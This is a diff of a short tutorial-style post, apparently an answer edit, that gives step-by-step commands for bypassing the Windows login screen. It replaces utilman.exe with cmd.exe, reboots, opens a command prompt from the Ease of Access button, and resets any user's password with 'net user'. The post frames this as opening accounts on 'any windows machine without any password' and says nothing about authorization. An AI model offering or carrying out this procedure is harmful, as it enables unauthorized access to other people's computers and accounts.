@@ -44,5 +44,23 @@ as you may know you can open accounts on any windows machine without any passwor
 
     move c:\windows\system32\utilman.exe c:\ 
 
-<p>c is directory that windows is installed,and maybe it is different in your pc.</p>
+<p>c is directory that windows is installed,and maybe it is different in your pc.and then this command:</p>
+
+    copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe
+
+
+<p>after all:</p>
+
+
+    wpeutil reboot
+
+<p>after the reboot  click on ease of use,CMD will opens then type:</p>
+
+    net user
+
+<p>after you saw users then the user you want to login with:</p>
+
+    net user <desired user> <your password>
+
+<p> you are in windows now!</p>
 
